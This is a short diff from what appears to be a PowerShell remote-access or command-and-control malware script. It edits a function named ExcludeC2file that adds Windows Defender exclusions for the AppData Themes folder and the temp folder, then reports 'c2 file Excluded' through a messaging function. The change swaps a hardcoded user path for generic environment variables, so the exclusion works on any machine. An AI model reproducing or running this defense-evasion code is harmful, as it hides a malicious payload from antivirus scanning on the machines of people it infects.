@@ -1237,8 +1237,8 @@ Function ExcludeCDrive {
 }
 
 Function ExcludeC2file {
-    Add-MpPreference -ExclusionPath C:\Users\lorib\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-	Add-MpPreference -ExclusionPath C:\Users\lorib\AppData\Local\Temp
+    Add-MpPreference -ExclusionPath %APPDATA%\Microsoft\Windows\Themes\
+	Add-MpPreference -ExclusionPath %temp%
     sendMsg -Message ":white_check_mark: ``c2 file Excluded`` :white_check_mark:"
 }
 
